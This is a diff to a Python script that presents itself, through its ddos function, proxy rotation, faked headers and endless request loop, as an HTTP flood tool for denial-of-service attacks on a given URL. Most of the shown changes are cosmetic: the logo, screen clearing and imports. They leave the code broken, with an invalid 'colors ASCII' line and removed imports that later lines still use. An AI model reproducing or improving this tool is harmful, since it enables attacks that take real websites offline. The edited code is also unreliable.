@@ -1,16 +1,16 @@
 #!/usr/bin/python3
 # -*- coding: utf-8  -*-
-import requests as r, os, threading, random, click, fake_headers
+import requests as r, threading, random, click, fake_headers
 from threading import Thread
-from colorama import Fore, Style, init
-from fake_headers import Headers
-import fade
-def clear(): 
-	if os.name == 'nt': 
-		os.system('cls') 
-	
-os.system('clear')
-logo = """		
+import os
+
+# Clear screen
+os.system('cls' if os.name == 'nt' else 'clear')
+
+
+# ASCII Logo
+LOGO = """    
+\033[92m
 {Fore.RED}██▒▒   ██▒▒ ██▒▒   ██▒▒ ████▒▒    ██▒▒              ██████▒▒╗
 {Fore.RED}███▒▒ ██▒▒  ██▒▒   ██▒▒ ██▒██▒▒   ██▒▒            ██▒▒╔═╗██▒▒╗
 {Fore.RED}██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒██▒▒  ██▒▒           ██▒▒║   ║██▒▒║
@@ -18,7 +18,7 @@ logo = """
 {Fore.RED}██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒  ██▒▒██▒▒           ██▒▒║██████▒▒║
 {Fore.RED}██▒▒ ██▒▒   ██▒▒   ██▒▒ ██▒▒   ██▒██▒▒           ██▒▒╔═══╗██▒▒║
 {Fore.RED}██▒▒  ██▒▒   ███████▒▒  ██▒▒    ████▒▒           ██▒▒║    ║██▒▒║
-                                                                ╚═══╝    ╚════╝
+ \033[0m                                                               ╚═══╝    ╚════╝
 """
 faded_text = fade.fire(logo)
 print(faded_text)
@@ -49,7 +49,7 @@ def check(ip, prox, url):
 
 def ddos(prox, url):
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+	colors ASCII
 	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
